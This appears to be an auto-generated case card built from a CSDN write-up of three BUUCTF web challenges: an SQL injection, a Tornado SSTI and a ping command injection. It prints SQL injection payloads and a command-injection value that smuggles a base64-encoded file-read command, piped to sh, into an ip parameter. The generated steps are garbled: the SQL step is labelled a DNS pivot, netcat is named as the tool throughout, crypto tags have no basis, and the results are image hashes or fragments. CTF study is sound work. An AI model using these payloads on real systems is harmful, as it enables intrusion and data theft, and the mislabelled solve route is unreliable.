# BUUCTF部分web题解（easysql，easy_tornado，Ping Ping Ping）_obsetear的博客-CSDN博客_ctf web题ping

## Case Metadata

- Category: `Web`
- Platform: `BUUCTF部分web题解（easysql，easy`
- Difficulty: `unknown`
- Source repository: `https://github.com/apachecn/apachecn-ctf-wiki`
- Source commit: `762ca130572c95196cf120e5f4ad5fbdd88b1b93`
- Source file: `docs/BUUCTF部分web题解（easysql，easy_tornado，Ping-Ping-Ping）_obsetear的博客-CSDN博客_ctf-web题ping.md`
- Source URL: `https://github.com/apachecn/apachecn-ctf-wiki/blob/762ca130572c95196cf120e5f4ad5fbdd88b1b93/docs/BUUCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3%EF%BC%88easysql%EF%BC%8Ceasy_tornado%EF%BC%8CPing-Ping-Ping%EF%BC%89_obsetear%E7%9A%84%E5%8D%9A%E5%AE%A2-CSDN%E5%8D%9A%E5%AE%A2_ctf-web%E9%A2%98ping.md`
- Local source mirror: `sources/apachecn-apachecn-ctf-wiki/repo/docs/BUUCTF部分web题解（easysql，easy_tornado，Ping-Ping-Ping）_obsetear的博客-CSDN博客_ctf-web题ping.md`

## Why This Case Matters

Use this case as a Web reference for ciphertext, web-app challenges.

## Input Signals

- Artifacts: ciphertext, web-app
- Tools: netcat
- Techniques: classical-crypto, command-injection, crypto-analysis, dns-analysis, encoding-analysis, php-tricks, sql-injection, ssti, waf-bypass, web-exploitation

## First-Principles Route

- Identify the exposed entry point, reflected behavior, trust boundary, and any explicit hints or blacklists.
- Validate the suspected primitive with the smallest payload that proves code/data/control influence.
- Chain the primitive into file read, code execution, auth bypass, or state manipulation only after recording the bypass condition.

## Linked Assets

- Referenced assets: `22`
- `docs/img/b3c908e7cc148daf47cec33c78170746.png`
- `docs/img/f451ca8bb62c2a64ee5cb75c5077cf17.png`
- `docs/img/8168cdcc951ef1a3174538d0c49da228.png`
- `docs/img/926d16e46517d1ad452ae6d89c9b26e4.png`
- `docs/img/2ae5fc8e23d81699ccde8bf6247fec3e.png`
- `docs/img/3977398fbb1912e860ea7974adfa78f2.png`
- `docs/img/6d06d2fc353d7e191dd7527a30c5e796.png`
- `docs/img/2ef646e4e64ecb320059772c291b04a3.png`
- `docs/img/af487510a49ded4db1f170ea21410418.png`
- `docs/img/474a9f14a7e23f4abe614ee4f2a3e7a7.png`
- `docs/img/4002513554a0c7c88ebac8a52d23148c.png`
- `docs/img/c8d92e15ba7a53375eb45cb9f438c169.png`
- ... and `10` more

## Solve Thinking

### Step 1: Document

- Route type: `netcat-driven evidence lookup`
- Why: For Web, keep every answer tied to one artifact, one probe, and one proof field.
- Probe: Use netcat to collect the smallest evidence slice that answers the goal.
- Tools: netcat
- Reasoning chain:
  - Recognize the section as netcat-driven evidence lookup.
  - Use netcat to collect the smallest evidence slice that answers the goal.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `-->`

### Step 2: BUUCTF部分web题解（easysql，easy_tornado，Ping Ping Ping）_obsetear的博客-CSDN博客_ctf web题ping

- Route type: `http evidence extraction`
- Why: HTTP questions usually reduce to request metadata, response body, host/URI correlation, or object extraction.
- Probe: Use netcat to inspect HTTP requests, hosts, URIs, headers, and response bodies.
- Tools: netcat
- Reasoning chain:
  - Recognize the section as http evidence extraction.
  - Use netcat to inspect HTTP requests, hosts, URIs, headers, and response bodies.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `> 来源：[https://blog.csdn.net/weixin_44300286/article/details/108512157](https://blog.csdn.net/weixin_44300286/article/details/108512157)`

### Step 3: easysql

- Route type: `dns pivot`
- Why: DNS questions usually reduce to source host, resolver, queried name, response, or packet number pivots.
- Probe: Use netcat with the extracted filter/query `select $_GET['query'] || flag from flag` and inspect the matching evidence.
- Tools: netcat
- Filters or commands:
  - `select $_GET['query'] || flag from flag`
  - `构造payload：`*,1`，得到`select *,1 || flag from flag`，即可查出表中的内容`
  - `还可以用另一种解法：通过堆叠注入，设置sql_mode的值为PIPES_AS_CONCAT，从而将||视为字符串的连接操作符而非或运算符。`
  - `得到`select 1;set sql_mode=PIPES_AS_CONCAT;select 1 || flag from flag``
  - ``1 || name`被看成了一个整体，上述语句相当于：`select A,B from guestbook`，由于*代表查询所有内容，故能回显出整个表的内容`
- Reasoning chain:
  - Recognize the section as dns pivot.
  - Use netcat with the extracted filter/query `select $_GET['query'] || flag from flag` and inspect the matching evidence.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `b3c908e7cc148daf47cec33c78170746`

### Step 4: easy_tornado

- Route type: `ssti exploitation`
- Why: SSTI cases should prove evaluation first, then turn blacklist details into object-traversal or file-read pivots.
- Probe: Use netcat to validate template evaluation with the smallest safe expression, then extend toward controlled object traversal or file read.
- Tools: netcat
- Reasoning chain:
  - Recognize the section as ssti exploitation.
  - Use netcat to validate template evaluation with the smallest safe expression, then extend toward controlled object traversal or file read.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `6d06d2fc353d7e191dd7527a30c5e796`

### Step 5: Ping Ping Ping

- Route type: `command execution path`
- Why: Command execution routes should separate syntax proof, filter bypass, and final file-read or shell step.
- Probe: Use netcat with the extracted filter/query `命令执行，;或管道符（|）分割批量执行命令` and inspect the matching evidence.
- Tools: netcat
- Filters or commands:
  - `命令执行，;或管道符（|）分割批量执行命令`
  - `?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh`
  - `|base64 -d：对前面的字符串进行base64解密`
  - `|sh：把左边的命令交给sh去执行`
  - `cmd1 | cmd2 只执行cmd2`
  - `cmd1 || cmd2 只有当cmd1执行失败后，cmd2才被执行`
- Reasoning chain:
  - Recognize the section as command execution path.
  - Use netcat with the extracted filter/query `命令执行，;或管道符（|）分割批量执行命令` and inspect the matching evidence.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `127.0.0.1`

## Reuse Checklist

- Match the new challenge's artifact and question shape against this case before copying any tool sequence.
- Start from the same evidence class, then adapt filters, fields, and timestamps to the new artifact.
- Promote any repeated manual action into a skill command before relying on it for the final solve.
